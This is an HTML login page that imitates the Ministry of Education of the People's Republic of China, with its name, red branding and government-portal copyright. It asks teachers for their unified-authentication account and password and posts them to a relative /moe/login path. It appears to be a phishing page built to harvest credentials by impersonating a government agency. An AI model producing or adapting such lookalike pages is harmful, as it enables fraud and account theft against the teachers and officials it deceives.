<!doctype html><html lang="zh-CN"><head><meta charset="utf-8"><title>教育部官网-通知公告发布系统</title>
<style>body{margin:0;font-family:"Microsoft YaHei",Arial,sans-serif;background:#f6f8fb;color:#333}
header{background:#b5121b;color:#fff;padding:16px 40px;display:flex;align-items:center;gap:24px}
.logo{font-size:23px;font-weight:700;letter-spacing:2px}
.card{margin:36px auto;width:440px;background:#fff;border:1px solid #e5e9f0;border-radius:6px;padding:30px;box-shadow:0 2px 8px #0001}
.card h2{margin:0 0 6px;font-size:20px;color:#b5121b}.card p{margin:0 0 16px;font-size:13px;color:#999}
label{display:block;font-size:13px;color:#555;margin:12px 0 6px}
input{width:100%;height:40px;border:1px solid #ccd;border-radius:6px;padding:0 10px;font-size:14px;box-sizing:border-box}
button{width:100%;height:42px;margin-top:18px;background:#b5121b;color:#fff;border:none;border-radius:6px;font-size:15px;cursor:pointer}
footer{padding:20px;text-align:center;color:#999;font-size:12px}</style></head>
<body><header><span class="logo">中华人民共和国教育部</span><span>通知公告系统</span></header>
<div class="card"><h2>教师用户登录</h2><p>登录后可查看内部通知与填报数据</p>
<form action="/moe/login" method="post">
<label>统一认证账号</label><input placeholder="请输入账号">
<label>密码</label><input type="password" placeholder="请输入密码">
<button type="submit">进入系统</button></form></div>
<footer>© 中华人民共和国教育部政府门户网站</footer></body></html>
